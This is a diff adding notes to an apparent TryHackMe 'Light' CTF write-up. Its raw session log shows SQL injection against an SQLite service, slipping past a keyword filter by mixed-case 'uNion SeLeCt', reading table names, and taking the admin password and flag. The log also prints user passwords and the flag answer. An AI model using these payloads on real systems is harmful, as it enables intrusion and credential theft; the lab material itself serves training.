@@ -67,6 +67,7 @@ Welcome to the Light database!
 Please enter your username: smokey
 Password: vYQ5ngPpw8AdUmL
 
+### via py script get this users
 
 Found: alice
 Password: tF8tj2o94WE4LKC
@@ -88,6 +89,67 @@ Password: yAn4fPaF2qpCKpR
 
 Found: steve
 Password: WObjufHX1foR8d7
+
+### all users and passwords are uselless
+
+## ke is SQL injection but is union and select words are deny
+
+The application also blocks and filters SQL commands such as SELECT or UNION. However, we can bypass this filter by simply randomizing the capitalization of the commands (e.g. SeLeCT or UniOn).
+
+hh there is a word in there I don't like :(
+Please enter your username: password
+Username not found.
+Please enter your username: From
+Username not found.
+Please enter your username: \x27UNION SELECT
+Ahh there is a word in there I don't like :(
+Please enter your username: \x27UNION       
+Ahh there is a word in there I don't like :(
+Please enter your username: select
+Ahh there is a word in there I don't like :(
+Please enter your username: /*select
+For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)
+Please enter your username: smokey'
+Error: unrecognized token: "'smokey'' LIMIT 30"
+Please enter your username: smokey' OR users like 's%
+Error: no such column: users
+Please enter your username: smokey' OR users like 's%
+Error: no such column: users
+Please enter your username: smokey' OR users like 's%
+Error: no such column: users
+Please enter your username: smokey' OR user like 's%
+Error: no such column: user
+Please enter your username: smokey' OR password like 's%
+Password: vYQ5ngPpw8AdUmL
+Please enter your username: smokwk
+Username not found.
+Please enter your username: smokey
+Password: vYQ5ngPpw8AdUmL
+Please enter your username: smokey' OR admintable like 's%
+Error: no such column: admintable
+Please enter your username: select
+Ahh there is a word in there I don't like :(
+Please enter your username: SeLeCT
+Username not found.
+Please enter your username: smokey' UniIOn SelEcT name FROM sqlite_master WHERE type='table
+Error: near "UniIOn": syntax error
+Please enter your username: smokey' uniIOn SelEcT name FROM sqlite_master WHERE type='table
+Error: near "uniIOn": syntax error
+Please enter your username: 1' uNion SeLeCt sqlite_version() '1
+Password: 3.31.1
+Please enter your username: 1' uNion SeLeCt name FROM sqlite_master '1
+Password: admintable
+Please enter your username: 1' uNion SeLeCt username from admintable '1
+Password: TryHackMeAdmin
+Please enter your username: 1' uNion SeLeCt password from admintable where username = '<ADMIN_USERNAME>
+Username not found.
+Please enter your username: 1' uNion SeLeCt password from admintable where username = 'TryHackMeAdmin
+Password: mamZtAuMlrsEy5bp6q17
+Please enter your username: 1' uNion SeLeCt password from admintable '1
+Password: THM{SQLit3_InJ3cTion_is_SimplE_nO?}
+Please enter your username: ^C
+
+
 
 
 <\Code>
